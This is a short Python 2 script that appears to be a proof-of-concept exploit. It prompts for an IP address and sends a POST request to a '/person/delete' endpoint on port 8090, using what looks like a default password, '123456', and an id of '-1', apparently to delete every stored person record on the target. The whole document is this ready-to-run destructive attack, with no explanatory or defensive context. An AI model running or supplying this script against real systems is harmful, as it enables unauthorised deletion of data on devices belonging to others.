# -*- coding: utf-8 -*-
__author__ = 'Px'

import sys
import time
import requests



reload(sys)
sys.setdefaultencoding('utf8')

ip = raw_input('ip:')
url = 'http://{}:8090/person/delete'.format(ip)

data = {
    'pass':'123456',
    'id':'-1'}

result = requests.post(url,data=data).content
print result



